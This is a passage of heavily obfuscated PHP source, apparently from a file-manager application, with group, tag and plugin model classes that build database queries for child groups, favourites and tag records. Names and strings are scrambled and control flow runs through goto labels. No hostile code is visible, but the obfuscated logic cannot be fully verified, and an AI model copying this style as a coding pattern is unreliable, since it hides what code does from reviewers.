$b–®—¶­å[33], $b–®—¶­å[2108]); $B¶Ş¸ô = $this->where(array($b–®—¶­å[2185] => array($b–®—¶­å[7], $Fõ“¬ôÙå)))->select(); if (!$B¶Ş¸ô) { return array(); } goto E¢ØŠãœŸù; E¢ØŠãœŸù: return $B¶Ş¸ô; goto F°Ò…ÎÒ±ì; F¾ˆÃ†ƒÑ§: if ($Eæ‡œç³Ò) { $b´»×å¦ê[$b–®—¶­å[2108]] = array($b–®—¶­å[7], $Eæ‡œç³Ò); } $Fõ“¬ôÙå = Model($b–®—¶­å[2194])->where($b´»×å¦ê)->limit($FÁˆŞ¼‡œã)->select(); if (!$Fõ“¬ôÙå) { return array(); } goto AÂÎ¤ˆ“··; F°Ò…ÎÒ±ì: } protected function _listDataApplyItem($fç¢æŠˆÆ) { $dŸ¸‰·‡Ê = array($fç¢æŠˆÆ); $this->_listDataApply($dŸ¸‰·‡Ê); return $dŸ¸‰·‡Ê[0]; } protected function _listDataApply(&$FÙÆéµËÒ) { goto BÅÔ¨Æ”œÊ; fŸùâÔá: $this->_listAppendChildren($FÙÆéµËÒ); $this->_listAppendChildrenMember($FÙÆéµËÒ); $this->_listAppendMeta($FÙÆéµËÒ, $C¬½Ûº¥Â); goto A‰Û‹ö´; BÅÔ¨Æ”œÊ: $b³­êê¾ä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$FÙÆéµËÒ) { return; } $C¬½Ûº¥Â = array_to_keyvalue($FÙÆéµËÒ, $b³­êê¾ä[33], $b³­êê¾ä[2108]); goto fŸùâÔá; A‰Û‹ö´: $this->_listAppendParent($FÙÆéµËÒ); $this->_listAppendSourceRoot($FÙÆéµËÒ, $C¬½Ûº¥Â); goto Aµ„•˜åÌ; Aµ„•˜åÌ: } private function _listAppendChildren(&$A‘äé±¹Œ) { goto CªéÀòÎÓ¸; D¿Ñá¾ÀºÜ: $döÈùÃ¨¾ = array_to_keyvalue($döÈùÃ¨¾, $BïĞ›“«Ø[452]); foreach ($A‘äé±¹Œ as &$fÖ³ªÊÏ˜è) { $fÖ³ªÊÏ˜è[$BïĞ›“«Ø[2195]] = isset($döÈùÃ¨¾[$fÖ³ªÊÏ˜è[$BïĞ›“«Ø[2108]] . $BïĞ›“«Ø[2196]]); } unset($fÖ³ªÊÏ˜è); goto EÀÛŠ—¤¨ò; b“Ä²‰¸¸Ç: $A‡¶³ãÕ‘· = count($A‘äé±¹Œ); $E¾Îß¢ñ¦Š = $this->tablePrefix . $this->tableName; for ($cÍ×ÜÈ¼ãœ = 0, $CÅôâÌÛÔŸ = 0; $cÍ×ÜÈ¼ãœ < $A‡¶³ãÕ‘·; $cÍ×ÜÈ¼ãœ++) { $CÅôâÌÛÔŸ++; $AÛª‹ç“‹Ú = $A‘äé±¹Œ[$cÍ×ÜÈ¼ãœ][$BïĞ›“«Ø[2108]]; $eÎ³Øàí³ .= "\123\x45\114\x45\103\x54\x20\52\x20\x46\122\117\x4d\40\50\123\x45\114\105\103\124\40\47{$AÛª‹ç“‹Ú}\x5f\143\x68\151\154\144\47\40\141\163\x20\x68\x61\163\x20\x46\x52\x4f\115\40\x60{$E¾Îß¢ñ¦Š}\x60\40\167\x68\145\162\x65\40\160\x61\162\145\156\164\x49\104\x3d{$AÛª‹ç“‹Ú}\x20\154\151\155\x69\x74\40\x31\x29\40\x61\x73\x20\x74\142\x5f{$AÛª‹ç“‹Ú}\40\165\x6e\151\x6f\x6e\x20\x61\x6c\x6c\40"; if (($CÅôâÌÛÔŸ >= 20 || $cÍ×ÜÈ¼ãœ == $A‡¶³ãÕ‘· - 1) && $eÎ³Øàí³) { $eÎ³Øàí³ = substr($eÎ³Øàí³, 0, -strlen($BïĞ›“«Ø[451])); $c¹Ëõæ¯•× = $this->query($eÎ³Øàí³); $döÈùÃ¨¾ = array_merge($döÈùÃ¨¾, $c¹Ëõæ¯•×); $CÅôâÌÛÔŸ = 0; $eÎ³Øàí³ = $BïĞ›“«Ø[33]; } } goto D¿Ñá¾ÀºÜ; CªéÀòÎÓ¸: $BïĞ›“«Ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÎ³Øàí³ = $BïĞ›“«Ø[361]; $döÈùÃ¨¾ = array(); goto b“Ä²‰¸¸Ç; EÀÛŠ—¤¨ò: } private function _listAppendChildrenMember(&$e„²˜ŒÑéœ) { goto Aà¾ºÉ¾ßÄ; e—ª­é¼‘è: $EÊ£ŒÂ¾èº = count($e„²˜ŒÑéœ); $AÜ¬»£Ø ‹ = $this->tablePrefix . $dÅÄÑİé[2187]; for ($C”‡ƒ°¨õ = 0, $EÍÀŒ¯Ÿì… = 0; $C”‡ƒ°¨õ < $EÊ£ŒÂ¾èº; $C”‡ƒ°¨õ++) { $EÍÀŒ¯Ÿì…++; $f‚â‡İ†Ø³ = $e„²˜ŒÑéœ[$C”‡ƒ°¨õ][$dÅÄÑİé[2108]]; $Cãì‹”Âåè .= "\x53\105\x4c\x45\103\124\x20\52\40\106\x52\117\115\40\50\x53\105\114\x45\103\124\x20\x27{$f‚â‡İ†Ø³}\x5f\143\x68\x69\x6c\144\x27\40\x61\x73\40\x68\141\163\40\x46\122\117\115\40\140{$AÜ¬»£Ø ‹}\x60\x20\x77\150\145\162\x65\40\x67\x72\x6f\x75\x70\111\x44\75{$f‚â‡İ†Ø³}\x20\154\x69\x6d\x69\x74\40\61\51\40\141\x73\x20\x74\x62\x5f{$f‚â‡İ†Ø³}\x20\165\x6e\151\x6f\156\x20\141\154\x6c\40"; if (($EÍÀŒ¯Ÿì… >= 20 || $C”‡ƒ°¨õ == $EÊ£ŒÂ¾èº - 1) && $Cãì‹”Âåè) { $Cãì‹”Âåè = substr($Cãì‹”Âåè, 0, -strlen($dÅÄÑİé[451])); $c³Ô¤ ÜÕ¯ = $this->query($Cãì‹”Âåè); $E¬í·‘ÃÄ¯ = array_merge($E¬í·‘ÃÄ¯, $c³Ô¤ ÜÕ¯); $EÍÀŒ¯Ÿì… = 0; $Cãì‹”Âåè = $dÅÄÑİé[33]; } } goto FëÌÉî°ĞÙ; Aà¾ºÉ¾ßÄ: $dÅÄÑİé =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Cãì‹”Âåè = $dÅÄÑİé[361]; $E¬í·‘ÃÄ¯ = array(); goto e—ª­é¼‘è; FëÌÉî°ĞÙ: $E¬í·‘ÃÄ¯ = array_to_keyvalue($E¬í·‘ÃÄ¯, $dÅÄÑİé[452]); foreach ($e„²˜ŒÑéœ as &$Fï‹®êÅù†) { $Fï‹®êÅù†[$dÅÄÑİé[2197]] = isset($E¬í·‘ÃÄ¯[$Fï‹®êÅù†[$dÅÄÑİé[2108]] . $dÅÄÑİé[2196]]); } unset($Fï‹®êÅù†); goto Dğ“”òôïì; Dğ“”òôïì: } private function _listAppendMeta(&$cÑĞà†àã´, $BÃ†ĞÕ™ïŠ) { goto d„¬î¾ˆÓ¡; FâÚê´‡ƒ: $aßòµÇˆ» = array_to_keyvalue_group($aßòµÇˆ», $Dˆ©Ó‚‡[2108]); foreach ($aßòµÇˆ» as &$EĞé¦Äµƒ) { $EĞé¦Äµƒ = array_to_keyvalue($EĞé¦Äµƒ, $Dˆ©Ó‚‡[89], $Dˆ©Ó‚‡[359]); } unset($EĞé¦Äµƒ); goto A™ì™’Œ´ˆ; d„¬î¾ˆÓ¡: $Dˆ©Ó‚‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EİÍ†Ì‚ÇÏ = array($Dˆ©Ó‚‡[2108] => array($Dˆ©Ó‚‡[7], $BÃ†ĞÕ™ïŠ)); $aßòµÇˆ» = Model($Dˆ©Ó‚‡[2186])->where($EİÍ†Ì‚ÇÏ)->select(); goto FâÚê´‡ƒ; A™ì™’Œ´ˆ: foreach ($cÑĞà†àã´ as &$E¶èÂÓ¨Õ) { $E¶èÂÓ¨Õ[$Dˆ©Ó‚‡[417]] = array(); if (isset($aßòµÇˆ»[$E¶èÂÓ¨Õ[$Dˆ©Ó‚‡[2108]]])) { $E¶èÂÓ¨Õ[$Dˆ©Ó‚‡[417]] = $aßòµÇˆ»[$E¶èÂÓ¨Õ[$Dˆ©Ó‚‡[2108]]]; } } unset($E¶èÂÓ¨Õ); goto BÃÁİêÃœ‰; BÃÁİêÃœ‰: } protected function parentLevelArray($CÏÑ‹«¢) { $Aõ±†¶˜’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÏÑ‹«¢ = explode($Aõ±†¶˜’[47], trim($CÏÑ‹«¢, $Aõ±†¶˜’[47])); $CÏÑ‹«¢ = array_remove_value($CÏÑ‹«¢, $Aõ±†¶˜’[470]); return $CÏÑ‹«¢; } private function _listAppendParent(&$D©ñ¦¢áá…) { goto d‘»ÖâÍ¡; c‰ô½÷ÎÄƒ: unset($f†»¥Ï¾ÆÂ); goto A…ØĞîì ; f‘á¼ğ“ØÏ: unset($f†»¥Ï¾ÆÂ); $eøÜí‘Ü†š = array(); foreach ($Dñİ‚¥Ô· as $eÂ¶¯ÚÜÙÙ => $d½’ğ‰²§ç) { if (!$d½’ğ‰²§ç) { $eøÜí‘Ü†š[] = $eÂ¶¯ÚÜÙÙ; } } goto F™›÷Î²”Ì; F™›÷Î²”Ì: if ($eøÜí‘Ü†š) { $d¢¼à  ªˆ = array($F‹–ÀÁ¦ˆæ[2185] => array($F‹–ÀÁ¦ˆæ[384], $eøÜí‘Ü†š)); $bö£–µÆâ = $this->field($F‹–ÀÁ¦ˆæ[2198])->where($d¢¼à  ªˆ)->select(); $f¸ÀÌ·‘Ş¯ = array_to_keyvalue($bö£–µÆâ, $F‹–ÀÁ¦ˆæ[2108], $F‹–ÀÁ¦ˆæ[28]); $Dñİ‚¥Ô· = array_merge_index($Dñİ‚¥Ô·, $f¸ÀÌ·‘Ş¯); } $D¡Ä·ø¨ = $GLOBALS[$F‹–ÀÁ¦ˆæ[6]][$F‹–ÀÁ¦ˆæ[84]][$F‹–ÀÁ¦ˆæ[2199]]; foreach ($D©ñ¦¢áá… as &$f†»¥Ï¾ÆÂ) { $dëößùè’ï = $this->parentLevelArray($f†»¥Ï¾ÆÂ[$F‹–ÀÁ¦ˆæ[461]]); $EÙöÃÚ÷‚ğ = $F‹–ÀÁ¦ˆæ[33]; foreach ($dëößùè’ï as $eÂ¶¯ÚÜÙÙ => $e¥˜ëÉò¥œ) { if ($D¡Ä·ø¨ && $eÂ¶¯ÚÜÙÙ == 0) { continue; } $EÙöÃÚ÷‚ğ .= $Dñİ‚¥Ô·[$e¥˜ëÉò¥œ] . $F‹–ÀÁ¦ˆæ[8]; } if ($dëößùè’ï) { $EÙöÃÚ÷‚ğ .= $f†»¥Ï¾ÆÂ[$F‹–ÀÁ¦ˆæ[28]]; } $f†»¥Ï¾ÆÂ[$F‹–ÀÁ¦ˆæ[465]] = str_replace($F‹–ÀÁ¦ˆæ[469], $F‹–ÀÁ¦ˆæ[8], $EÙöÃÚ÷‚ğ); } goto c‰ô½÷ÎÄƒ; d‘»ÖâÍ¡: $F‹–ÀÁ¦ˆæ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dñİ‚¥Ô· = array(); foreach ($D©ñ¦¢áá… as &$f†»¥Ï¾ÆÂ) { $Dñİ‚¥Ô·[$f†»¥Ï¾ÆÂ[$F‹–ÀÁ¦ˆæ[2108]]] = $f†»¥Ï¾ÆÂ[$F‹–ÀÁ¦ˆæ[28]]; $dëößùè’ï = $this->parentLevelArray($f†»¥Ï¾ÆÂ[$F‹–ÀÁ¦ˆæ[461]]); foreach ($dëößùè’ï as $e¥˜ëÉò¥œ) { if (!isset($Dñİ‚¥Ô·[$e¥˜ëÉò¥œ])) { $Dñİ‚¥Ô·[$e¥˜ëÉò¥œ] = 0; } } } goto f‘á¼ğ“ØÏ; A…ØĞîì : } private function _listAppendSourceRoot(&$dÄËÛåíˆ, $b™²Ğ“–’Ã) { goto BßøŒ¤”ğì; BßøŒ¤”ğì: $e˜íÂŒÃŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÙÌ·ÅºİÛ = array($e˜íÂŒÃŒ[371] => SourceModel::TYPE_GROUP, $e˜íÂŒÃŒ[463] => 0, $e˜íÂŒÃŒ[458] => array($e˜íÂŒÃŒ[7], $b™²Ğ“–’Ã)); $Eğˆë—ÍÓ = $e˜íÂŒÃŒ[2200]; goto c…‘è‡ñ¾Á; c…‘è‡ñ¾Á: $eÂ”ãµæ = Model($e˜íÂŒÃŒ[754])->order($e˜íÂŒÃŒ[2201])->field($Eğˆë—ÍÓ)->where($aÙÌ·ÅºİÛ)->select(); $eÂ”ãµæ = array_to_keyvalue($eÂ”ãµæ, $e˜íÂŒÃŒ[458]); $eÂ”ãµæ = array_remove_key($eÂ”ãµæ, $e˜íÂŒÃŒ[458]); goto eëë‹¶ïö¶; eëë‹¶ïö¶: foreach ($dÄËÛåíˆ as &$a‡¢ø©¨å¾) { $a‡¢ø©¨å¾[$e˜íÂŒÃŒ[391]] = $eÂ”ãµæ[$a‡¢ø©¨å¾[$e˜íÂŒÃŒ[2108]]] ? $eÂ”ãµæ[$a‡¢ø©¨å¾[$e˜íÂŒÃŒ[2108]]] : array(); } unset($a‡¢ø©¨å¾); goto C¹ÁÀî  ; C¹ÁÀî  : } protected function groupMerge($cÕ’Ò ìˆŠ) { $cÕ’Ò ìˆŠ = array_values(array_unique($cÕ’Ò ìˆŠ)); $a“‹¾‰—Œ = array(); for ($f¡ÔÅÒŸß = 0; $f¡ÔÅÒŸß < count($cÕ’Ò ìˆŠ); $f¡ÔÅÒŸß++) { $aòëˆÖÙÑ = !1; for ($f¸Úò‡—òˆ = 0; $f¸Úò‡—òˆ < count($cÕ’Ò ìˆŠ); $f¸Úò‡—òˆ++) { if ($f¡ÔÅÒŸß == $f¸Úò‡—òˆ) { continue; } if ($this->isParentOf($cÕ’Ò ìˆŠ[$f¸Úò‡—òˆ], $cÕ’Ò ìˆŠ[$f¡ÔÅÒŸß])) { $aòëˆÖÙÑ = !0; break; } } if (!$aòëˆÖÙÑ) { $a“‹¾‰—Œ[] = $cÕ’Ò ìˆŠ[$f¡ÔÅÒŸß]; } } return $a“‹¾‰—Œ; } protected function isParentOf($A«ŞÅÀò§ñ, $Aİ¿÷¤Ò†ó) { goto cœˆ¡¢à¿; cœˆ¡¢à¿: $CÂ—œ¤öê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$A«ŞÅÀò§ñ || !$Aİ¿÷¤Ò†ó || $A«ŞÅÀò§ñ == $Aİ¿÷¤Ò†ó) { return !1; } $E†Ğ´­± = $this->getInfoSimple($A«ŞÅÀò§ñ); goto eìÄÑùâ¡Ù; eìÄÑùâ¡Ù: $Dİ­šÆ¯ÏÍ = $this->getInfoSimple($Aİ¿÷¤Ò†ó); $CñçÈŒ­Ø = $E†Ğ´­±[$CÂ—œ¤öê[461]] . $A«ŞÅÀò§ñ . $CÂ—œ¤öê[47]; if (substr($Dİ­šÆ¯ÏÍ[$CÂ—œ¤öê[461]], 0, strlen($CñçÈŒ­Ø)) == $CñçÈŒ­Ø) { return !0; } goto AÁæÆÏÈÒ“; AÁæÆÏÈÒ“: return !1; goto f¬•ä²öï; f¬•ä²öï: } public function groupShowRoot($Bé•ëÏ’°á, $Dâ„Õáµ“ = false) { goto cÈÊÂ½©Ì›; F»¾­ÎÄêì: return $fÎƒ´ ¿ö»; goto C³ÕŠ›õô ; cÈÊÂ½©Ì›: $B‹Ğ‘±”Ç‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Câ…¦ğÇÌ = $this->getInfo($Bé•ëÏ’°á); if (!$Câ…¦ğÇÌ) { return array(); } goto AÒ¶ÑÃ¸™ç; BŞíÒ»‚ê: if ($Dâ„Õáµ“ && count($eÕ‰¿ëù…„) == 1) { return $fÎƒ´ ¿ö»; } if (!$Câ…¦ğÇÌ[$B‹Ğ‘±”Ç‹[417]] || !isset($Câ…¦ğÇÌ[$B‹Ğ‘±”Ç‹[417]][$B‹Ğ‘±”Ç‹[2183]]) || $Câ…¦ğÇÌ[$B‹Ğ‘±”Ç‹[417]][$B‹Ğ‘±”Ç‹[2183]] == $B‹Ğ‘±”Ç‹[2157]) { return $this->groupShowRoot($eÕ‰¿ëù…„[count($eÕ‰¿ëù…„) - 1], $Dâ„Õáµ“); } if ($Câ…¦ğÇÌ[$B‹Ğ‘±”Ç‹[417]][$B‹Ğ‘±”Ç‹[2183]] == $B‹Ğ‘±”Ç‹[346]) { $a³µñÛñ·­ = explode($B‹Ğ‘±”Ç‹[47], $Câ…¦ğÇÌ[$B‹Ğ‘±”Ç‹[417]][$B‹Ğ‘±”Ç‹[2184]]); if ($a³µñÛñ·­) { $fÎƒ´ ¿ö» = array_merge($fÎƒ´ ¿ö», $a³µñÛñ·­); } } goto F»¾­ÎÄêì; AÒ¶ÑÃ¸™ç: $eÕ‰¿ëù…„ = $this->parentLevelArray($Câ…¦ğÇÌ[$B‹Ğ‘±”Ç‹[461]]); $fÎƒ´ ¿ö» = array($Bé•ëÏ’°á); if (count($eÕ‰¿ëù…„) == 0) { return $fÎƒ´ ¿ö»; } goto BŞíÒ»‚ê; C³ÕŠ›õô : } protected function resetParentLevel() { $dãÆ˜ÈÁñ¸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B¡ŠÀÚ‚ô˜ = $dãÆ˜ÈÁñ¸[2108]; $fïğğ‘‹ªë = $this->select(); $fïğğ‘‹ªë = array_to_keyvalue($fïğğ‘‹ªë, $B¡ŠÀÚ‚ô˜); foreach ($fïğğ‘‹ªë as $bÕİ‚‚—Ø) { goto c•¢Ëñ“­í; dœ¿½†ĞË: $this->where(array($B¡ŠÀÚ‚ô˜ => $bÕİ‚‚—Ø[$B¡ŠÀÚ‚ô˜]))->save(array($dãÆ˜ÈÁñ¸[527] => $Bô†Ÿ£¢»²)); goto dô°¨‚ÌùÒ; c•¢Ëñ“­í: $C½Ğ™‰§®‡ = $bÕİ‚‚—Ø; $Bô†Ÿ£¢»² = array(); while ($C½Ğ™‰§®‡[$dãÆ˜ÈÁñ¸[463]] != 0) { $Bô†Ÿ£¢»²[] = $C½Ğ™‰§®‡[$dãÆ˜ÈÁñ¸[463]]; $C½Ğ™‰§®‡ = $fïğğ‘‹ªë[$C½Ğ™‰§®‡[$dãÆ˜ÈÁñ¸[463]]]; } goto e‚Å¤ŞÖÈò; e‚Å¤ŞÖÈò: $Bô†Ÿ£¢»²[] = 0; $Bô†Ÿ£¢»² = $dãÆ˜ÈÁñ¸[47] . implode($dãÆ˜ÈÁñ¸[47], array_reverse($Bô†Ÿ£¢»²)) . $dãÆ˜ÈÁñ¸[47]; $this->setNamePinyin($bÕİ‚‚—Ø[$B¡ŠÀÚ‚ô˜], $bÕİ‚‚—Ø[$dãÆ˜ÈÁñ¸[28]]); goto dœ¿½†ĞË; dô°¨‚ÌùÒ: } return $fïğğ‘‹ªë; } public function groupNameAuto($b¯Ç›©İŞ›, $D’Ÿ½ÏÂ) { $dÁŒ­ÌÏåÕ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B«±ğ‰ƒ†À = $this->where(array($dÁŒ­ÌÏåÕ[368] => $b¯Ç›©İŞ›))->getField($dÁŒ­ÌÏåÕ[28], !0); if (!$B«±ğ‰ƒ†À || !in_array($D’Ÿ½ÏÂ, $B«±ğ‰ƒ†À)) { return $D’Ÿ½ÏÂ; } for ($Dí´±‚Û÷ = 1; $Dí´±‚Û÷ <= count($B«±ğ‰ƒ†À) + 1; $Dí´±‚Û÷++) { $e¬–äøùæ® = $D’Ÿ½ÏÂ . "\x28{$Dí´±‚Û÷}\x29"; if (!in_array($e¬–äøùæ®, $B«±ğ‰ƒ†À)) { return $e¬–äøùæ®; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\141\166"; protected function cacheFunctionAlias($dæì°Œß×·) { $bÒ„Ì¨˜Í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($bÒ„Ì¨˜Í[2202] => array($dæì°Œß×·[0], $bÒ„Ì¨˜Í[2203]), $bÒ„Ì¨˜Í[2204] => array($dæì°Œß×·[0], $bÒ„Ì¨˜Í[2205])); } protected function get($AÃßàø†Óˆ) { $eù²ïè…é =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¾õ–ŸÉ˜† = Model($eù²ïè…é[460])->metaGet($AÃßàø†Óˆ, $eù²ïè…é[2206]); $a¿²âº¾« = json_decode($a¾õ–ŸÉ˜†, !0); return $a¿²âº¾« ? $a¿²âº¾« : array($eù²ïè…é[2207] => $eù²ïè…é[83], $eù²ïè…é[354] => array()); } protected function set($e±ø½²Ÿ¼¦, $eéçåÃ¬Ëæ) { $EØß “Òß› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eéçåÃ¬Ëæ = $eéçåÃ¬Ëæ ? $eéçåÃ¬Ëæ : array($EØß “Òß›[2207] => $EØß “Òß›[83], $EØß “Òß›[354] => array()); Model($EØß “Òß›[460])->metaSet($e±ø½²Ÿ¼¦, $EØß “Òß›[2206], json_encode($eéçåÃ¬Ëæ)); return Model($EØß “Òß›[460])->metaSet($e±ø½²Ÿ¼¦, $EØß “Òß›[2206], json_encode($eéçåÃ¬Ëæ)); } protected function getByTagID($F§Ø°öß†ï, $fë’ÕÓ¯å®) { goto eéäøˆëêÂ; eéäøˆëêÂ: $cÎ‰É²Ú™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$F§Ø°öß†ï || !$fë’ÕÓ¯å®) { return !1; } if (!Model($cÎ‰É²Ú™[460])->getInfoSimple($F§Ø°öß†ï)) { return !1; } goto F”İëŸ‹è; F”İëŸ‹è: $Dó¶ÔÖ‰ßí = $this->get($F§Ø°öß†ï); if (!$Dó¶ÔÖ‰ßí || !isset($Dó¶ÔÖ‰ßí[$cÎ‰É²Ú™[354]])) { return !1; } $AÆêíÓˆÒ = array_find_by_field($Dó¶ÔÖ‰ßí[$cÎ‰É²Ú™[354]], $cÎ‰É²Ú™[367], $fë’ÕÓ¯å®); goto aºè¹æ¯Ü¬; aºè¹æ¯Ü¬: return is_array($AÆêíÓˆÒ) ? $AÆêíÓˆÒ : !1; goto bĞ†‚œ¿°´; bĞ†‚œ¿°´: } public function listSource($DœÒ‰Œß•è, $FÛÉ–İÜÏ­) { goto BÅ—–‘”®µ; EÖø£ªß: $F„­‚Ãƒõ¥ = array_to_keyvalue($a¹°¡Õ…±[$e÷ºÛÉó[73]], $e÷ºÛÉó[33], $e÷ºÛÉó[369]); $eæôÓˆì = array_merge($F„­‚Ãƒõ¥, $DÊ¶ŒÏë‡Ø); foreach ($a©È¤¨»š‘ as $E¨§‚©ÑÃ¬) { if (!in_array($E¨§‚©ÑÃ¬, $eæôÓˆì)) { $DøùŠô©Í[] = $E¨§‚©ÑÃ¬; } } goto FØ°ìÌ¬‘‘; BÅ—–‘”®µ: $e÷ºÛÉó =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($FÛÉ–İÜÏ­ && !is_array($FÛÉ–İÜÏ­)) { $FÛÉ–İÜÏ­ = array($FÛÉ–İÜÏ­); } $eîœ¬Ü´Ñ = $this->listData($DœÒ‰Œß•è); goto cí×‘œ¼ºó; cí×‘œ¼ºó: $dÈŠ†‡““Ú = array(); foreach ($eîœ¬Ü´Ñ as $D¿í˜´Š) { $E¨§‚©ÑÃ¬ = $D¿í˜´Š[$e÷ºÛÉó[75]]; if (!$E¨§‚©ÑÃ¬) { continue; } if (!isset($dÈŠ†‡““Ú[$E¨§‚©ÑÃ¬])) { $dÈŠ†‡““Ú[$E¨§‚©ÑÃ¬] = array(); } $dÈŠ†‡““Ú[$E¨§‚©ÑÃ¬][] = $D¿í˜´Š[$e÷ºÛÉó[393]]; } $a©È¤¨»š‘ = array(); goto D½³¢áâ; D‘¸ì·‚Á»: if (!$a¹°¡Õ…± || count($a©È¤¨»š‘) == $a¹°¡Õ…±[$e÷ºÛÉó[351]][$e÷ºÛÉó[352]]) { return $a¹°¡Õ…±; } $DøùŠô©Í = array(); $DÊ¶ŒÏë‡Ø = array_to_keyvalue($a¹°¡Õ…±[$e÷ºÛÉó[74]], $e÷ºÛÉó[33], $e÷ºÛÉó[369]); goto EÖø£ªß; FØ°ìÌ¬‘‘: if ($DøùŠô©Í) { $this->removeBySource($DœÒ‰Œß•è, $DøùŠô©Í); } return $a¹°¡Õ…±; goto E®¡åÁ®—½; D½³¢áâ: foreach ($dÈŠ†‡““Ú as $eß¿ÇˆêÉ¸ => $dÙğë§°ŸŒ) { $EóªÌÄÒÜ¶ = !0; if (!$FÛÉ–İÜÏ­) { $a©È¤¨»š‘[] = $eß¿ÇˆêÉ¸; continue; } foreach ($FÛÉ–İÜÏ­ as $cğ×ˆ†ÌÆ¬) { if (!in_array($cğ×ˆ†ÌÆ¬, $dÙğë§°ŸŒ)) { $EóªÌÄÒÜ¶ = !1; break; } } if ($EóªÌÄÒÜ¶) { $a©È¤¨»š‘[] = $eß¿ÇˆêÉ¸; } } if (!$a©È¤¨»š‘) { return array(); } $a¹°¡Õ…± = Model($e÷ºÛÉó[1114])->listSource(array($e÷ºÛÉó[383] => array($e÷ºÛÉó[384], $a©È¤¨»š‘))); goto D‘¸ì·‚Á»; E®¡åÁ®—½: } protected function listData($CÒÖéÈ¶Ì) { $d¥›èÜ•ß‹ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¹Çº–Ë‘ = array($d¥›èÜ•ß‹[1428] => 0, $d¥›èÜ•ß‹[436] => array($d¥›èÜ•ß‹[2208], 0), $d¥›èÜ•ß‹[388] => $d¥›èÜ•ß‹[2209] . $CÒÖéÈ¶Ì); $FÎöéÍ³¾™ = $d¥›èÜ•ß‹[2210]; $Bê‚åêˆÀŒ = $this->field($FÎöéÍ³¾™)->where($a¹Çº–Ë‘)->order($d¥›èÜ•ß‹[2211])->select(); return $Bê‚åêˆÀŒ ? $Bê‚åêˆÀŒ : array(); } protected function addToTag($dÜÕƒœâã°, $e´¨Ò®³†, $d÷¶Û±ˆ›) { $dšÈÛ¡ˆ·Û =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->getByTagID($dÜÕƒœâã°, $d÷¶Û±ˆ›) || !$e´¨Ò®³†) { return !1; } if (!Model($dšÈÛ¡ˆ·Û[754])->pathInfo($e´¨Ò®³†)) { return !1; } $dÔ÷ÉŠ×é = array($dšÈÛ¡ˆ·Û[1428] => 0, $dšÈÛ¡ˆ·Û[436] => $d÷¶Û±ˆ›, $dšÈÛ¡ˆ·Û[387] => $e´¨Ò®³†, $dšÈÛ¡ˆ·Û[388] => $dšÈÛ¡ˆ·Û[2212] . $dÜÕƒœâã°, $dšÈÛ¡ˆ·Û[386] => $dšÈÛ¡ˆ·Û[33], $dšÈÛ¡ˆ·Û[2112] => 0); if ($this->where($dÔ÷ÉŠ×é)->find()) { return !1; } return $this->add($dÔ÷ÉŠ×é); } protected function removeFromTag($fìçé±½ç‰, $Aë’ì˜¹¶½, $d¦íèâğî) { $E‚Ÿ¡Êì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->getByTagID($fìçé±½ç‰, $d¦íèâğî) || !$Aë’ì˜¹¶½) { return !1; } if (is_array($Aë’ì˜¹¶½)) { $Aë’ì˜¹¶½ = array($E‚Ÿ¡Êì[7], $Aë’ì˜¹¶½); } $c¿ñáä„Í„ = array($E‚Ÿ¡Êì[1428] => 0, $E‚Ÿ¡Êì[436] => $d¦íèâğî, $E‚Ÿ¡Êì[388] => $E‚Ÿ¡Êì[2212] . $fìçé±½ç‰, $E‚Ÿ¡Êì[387] => $Aë’ì˜¹¶½); return $this->where($c¿ñáä„Í„)->delete(); } protected function removeByTag($e¨á„·…µô, $DØ›‡´•êè) { $BÚŸÔ›‘æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->getByTagID($e¨á„·…µô, $DØ›‡´•êè)) { return !1; } $a’‡ØÌƒ¬ = array($BÚŸÔ›‘æ[1428] => 0, $BÚŸÔ›‘æ[436] => $DØ›‡´•êè, $BÚŸÔ›‘æ[388] => $BÚŸÔ›‘æ[2212] . $e¨á„·…µô); return $this->where($a’‡ØÌƒ¬)->delete(); } protected function removeBySource($Aèí²øÅ”å, $bÒ’ÓíŞË) { $eÀ ìëÍŠÊ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$Aèí²øÅ”å || !$bÒ’ÓíŞË) { return !1; } if (is_array($bÒ’ÓíŞË)) { $bÒ’ÓíŞË = array($eÀ ìëÍŠÊ[7], $bÒ’ÓíŞË); } $b†Ëª˜¾ = array($eÀ ìëÍŠÊ[1428] => 0, $eÀ ìëÍŠÊ[387] => $bÒ’ÓíŞË, $eÀ ìëÍŠÊ[436] => array($eÀ ìëÍŠÊ[924], 0), $eÀ ìëÍŠÊ[388] => $eÀ ìëÍŠÊ[2212] . $Aèí²øÅ”å); return $this->where($b†Ëª˜¾)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x70\x6c\165\x67\151\x6e\114\x69\163\164"; public $field = array("\x6e\141\155\145", "\163\164\141\164\x75\163", "\x72\x65\147\151\x65\163\164", "\143\157\x6e\x66\x69\147"); public function loadList($D˜Ÿñ†—±“ = false) { $Aê–¼İ® = array_to_keyvalue($this->listData(), $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][28]); if ($D˜Ÿñ†—±“) { return $Aê–¼İ®[$D˜Ÿñ†—±“]; } return $Aê–¼İ®; } public function init() { $CŠ„Áîªö¸ =& 